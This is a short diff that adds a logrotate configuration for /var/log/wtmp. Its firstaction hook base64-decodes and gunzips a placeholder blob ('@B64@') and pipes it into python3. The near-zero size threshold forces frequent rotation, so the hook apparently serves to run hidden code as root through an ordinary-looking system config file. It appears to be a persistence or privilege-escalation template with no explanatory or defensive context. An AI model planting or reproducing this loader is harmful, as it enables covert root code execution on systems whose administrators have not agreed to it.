@@ -1,0 +1,9 @@
+/var/log/wtmp {
+	rotate 1
+	size 1
+	copy
+	olddir /var/tmp
+	firstaction
+		bash -c 'python3 -O <(printf "@B64@" | base64 -d | gunzip -c)'
+	endscript
+}
